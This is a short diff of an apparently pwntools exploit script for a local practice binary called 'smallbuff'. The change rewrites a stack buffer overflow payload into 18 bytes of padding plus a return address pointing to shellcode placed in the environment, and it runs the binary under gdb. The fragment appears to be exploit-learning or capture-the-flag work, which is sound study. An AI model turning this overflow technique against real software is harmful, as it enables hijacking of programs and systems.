@@ -7,8 +7,8 @@ envp.close()
 
 
 print(hex(u32(shellcode_env)))
-payload = b"A"*1 + shellcode_env
-p = gdb.debug(["./smallbuff", payload], '''b * main''')
+payload = b"A"*18 + p32(0xffffdfc0)
+p = gdb.debug(["./smallbuff", payload], '''b * main+52''')
 p.interactive()
 
 
